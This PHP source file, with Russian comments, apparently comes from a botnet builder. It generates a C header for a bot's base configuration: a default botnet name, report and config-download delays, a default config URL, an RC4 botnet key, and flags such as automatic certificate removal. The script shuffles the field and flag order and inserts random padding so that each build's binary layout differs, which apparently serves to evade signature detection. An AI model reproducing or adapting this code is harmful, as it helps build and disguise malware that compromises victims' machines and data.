<?php
///////////////////////////////////////////////////////////////////////////////////////////////////
// Генерация структуры BASECONFIG.
///////////////////////////////////////////////////////////////////////////////////////////////////  

/*  
  Генерация структуры BASECONFIG.

  Return - содержимое h-файла.
*/
function generateBaseConfigHeader()
{
  $flags = array
  (
    "BCF_REMOVE_CERTS     ",  //Автоматически удалять сертификаты.
    "BCF_DISABLE_TCPSERVER",  //Отключить TCP-сервер.

    //Просто свободные биты. Думаю, что это положительно сыграет на рэндоме (на самом деле лень думать).
    "BCF_01               ",
    "BCF_02               ",
    "BCF_03               ",
    "BCF_04               ",
    "BCF_05               ",
    "BCF_06               ",
    "BCF_07               ",
    "BCF_08               ",
    "BCF_09               ",
    "BCF_10               ",
    "BCF_11               ",
    "BCF_12               ",
    "BCF_13               ",
    "BCF_14               ",
    "BCF_15               ",
    "BCF_16               ",
    "BCF_17               ",
    "BCF_18               ",
    "BCF_19               ",
    "BCF_20               ",
    "BCF_21               ",
    "BCF_22               ",
    "BCF_23               ",
    "BCF_24               ",
    "BCF_25               ",
    "BCF_26               ",
    "BCF_27               ",
    "BCF_28               ",
    "BCF_29               ",
    "BCF_30               ",
  );
  
  $vars = array
  (
    "DWORD flags;                               //Флаги BCF_*.",
    "WCHAR defaultBotnet[BOTNET_MAX_CHARS + 1]; //Имя ботнета по умолчанию.",
    "DWORD delayConfig;                         //Данные задержок для загрузки конфигурации.",
    "DWORD delayReport;                         //Данные задержок для отправки отчетов.",
    "DWORD delayStats;                          //Данные задержок для отправки статистики.",
    "char  defaultConfig[100 + 1];              //URL конфигурации по умолчанию.",
    "Crypt::RC4KEY baseKey;                     //Ключ шифрования ботнета.",
  );

  //Перемешиваем значения.
  shuffle($vars);
  shuffle($flags);

  //Добавляем флаги.
  $outputEnum = array();
  $i = 0;
  foreach($flags as $v)
  {
    $outputEnum[] = sprintf("  {$v} = 0x%08X", (1 << $i));
    $i++;
  }
  
  //Добовляем перед каждым значением структуры, произволный буффер.
  $outputStruct = '';
  $i = 0;
  $vars[] = 0; //Для добавления паддинга в конец.
  foreach($vars as $v)
  {
    if(($rnd = mt_rand(0, 100)) > 0)
    {
      $outputStruct .= "  BYTE  padding{$i}[{$rnd}];\r\n";
      $i++;
    }
    if(!empty($v))$outputStruct .= "  ".$v."\r\n";
  }

  //Выводим.
  return "enum\r\n{\r\n".implode(",\r\n", $outputEnum)."\r\n};\r\n\r\n".
         "typedef struct\r\n{\r\n{$outputStruct}}BASECONFIG;\r\n";
}
?>